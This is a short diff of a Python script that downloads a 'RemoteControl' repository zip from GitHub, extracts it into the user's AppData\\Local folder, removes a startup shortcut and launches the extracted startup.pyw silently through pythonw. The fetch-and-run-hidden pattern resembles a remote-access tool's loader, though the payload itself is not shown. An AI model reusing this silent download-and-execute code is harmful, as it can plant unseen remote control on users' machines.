@@ -7,13 +7,13 @@ import sys
 from pathlib import Path
 
 user_profile = os.environ['USERPROFILE']
-target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
+target_path = os.path.join(user_profile, 'AppData', 'Local')
 os.makedirs(target_path, exist_ok=True)
 
-os.remove(os.path.join(target_path, 'skibidi-startup', "startup.py"))
+os.remove(os.path.join(target_path, 'RemoteControl-startup', "startup.py"))
 
-r = requests.get("https://github.com/noel-create/skibidi/archive/refs/heads/startup.zip", allow_redirects=True)
-file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'skibidi-startup.zip')
+r = requests.get("https://github.com/noel-create/RemoteControl/archive/refs/heads/startup.zip", allow_redirects=True)
+file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'RemoteControl-startup.zip')
 open(file_path, 'wb').write(r.content)
 with zipfile.ZipFile(file_path, 'r') as zip_ref:
     zip_ref.extractall(target_path)
@@ -24,4 +24,4 @@ shortcut_name="MyPythonScript"
 shortcut_path = startup_dir / f"{shortcut_name}.lnk"
 os.remove(shortcut_path)
 
-subprocess.Popen(['pythonw', os.path.join(target_path, "skibidi-startup", "startup.pyw")])
+subprocess.Popen(['pythonw', os.path.join(target_path, "RemoteControl-startup", "startup.pyw")])
